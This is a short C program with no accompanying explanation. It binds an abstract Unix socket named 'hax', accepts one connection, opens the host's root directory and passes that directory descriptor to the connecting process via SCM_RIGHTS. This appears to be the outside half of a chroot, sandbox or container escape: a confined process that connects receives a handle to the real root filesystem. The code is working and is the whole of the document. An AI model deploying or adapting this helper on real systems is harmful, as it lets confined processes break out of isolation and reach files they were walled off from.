#include <sys/socket.h>
#include <sys/types.h>
#include <sys/un.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

int send_fd(int socket, int fd_to_send)
{
    // from http://blog.varunajayasiri.com/passing-file-descriptors-between-processes-using-sendmsg-and-recvmsg
    struct msghdr message;
    struct iovec iov[1];
    struct cmsghdr *control_message = NULL;
    char ctrl_buf[CMSG_SPACE(sizeof(int))];
    char data[1];

    memset(&message, 0, sizeof(struct msghdr));
    memset(ctrl_buf, 0, CMSG_SPACE(sizeof(int)));

    /* We are passing at least one byte of data so that recvmsg() will not return 0 */
    data[0] = ' ';
    iov[0].iov_base = data;
    iov[0].iov_len = sizeof(data);

    message.msg_name = NULL;
    message.msg_namelen = 0;
    message.msg_iov = iov;
    message.msg_iovlen = 1;
    message.msg_controllen =  CMSG_SPACE(sizeof(int));
    message.msg_control = ctrl_buf;

    control_message = CMSG_FIRSTHDR(&message);
    control_message->cmsg_level = SOL_SOCKET;
    control_message->cmsg_type = SCM_RIGHTS;
    control_message->cmsg_len = CMSG_LEN(sizeof(int));

    *((int *) CMSG_DATA(control_message)) = fd_to_send;

    return sendmsg(socket, &message, 0);
}

int main()
{
    int socket_fd, client_fd;
    struct sockaddr_un server_address;

    if ((socket_fd = socket(AF_UNIX, SOCK_STREAM, 0)) < 0) {
        perror("socket()");
        return -1;
    }

    memset(&server_address, 0, sizeof(server_address));
    server_address.sun_family = AF_UNIX;
    strcpy(server_address.sun_path, "#hax");
    server_address.sun_path[0] = 0;             // make it abstract

    if (bind(socket_fd, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
        perror("bind()");
        return -1;
    }

    if (listen(socket_fd, 1) != 0) {
        perror("listen()");
        return -1;
    }

    if ((client_fd = accept(socket_fd, 0, 0)) == -1) {
        perror("accept()");
        return -1;
    }

    int dir_fd = open("/", O_RDONLY);
    send_fd(client_fd, dir_fd);

    return 0;
}
